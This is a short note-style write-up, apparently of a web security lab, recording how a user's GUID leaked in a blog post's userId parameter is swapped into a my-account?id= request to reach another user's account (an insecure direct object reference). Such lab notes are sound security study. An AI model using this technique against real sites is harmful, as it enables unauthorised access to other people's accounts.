#recon
- my account details wiener:peter
## my-account
- my-account?id=50eff991-4f77-4175-9d06-14b535c86390


## view post 
- /post?postId=9
    ### when we request for a user who posted the blog [the user is carlos]
    - /blogs?userId=c2a57ec3-2ad1-43f4-b438-b33301829c85 

## post a comment


- we have carlos id - c2a57ec3-2ad1-43f4-b438-b33301829c85 

- Let's try accessing his account using my-account request...

use this request:
GET my-account?id=c2a57ec3-2ad1-43f4-b438-b33301829c85 


BOOM: WE HAVE ACCESS TO CARLOS ACCOUNT...

LESSON: always try looking for leaked user's id in request parameters...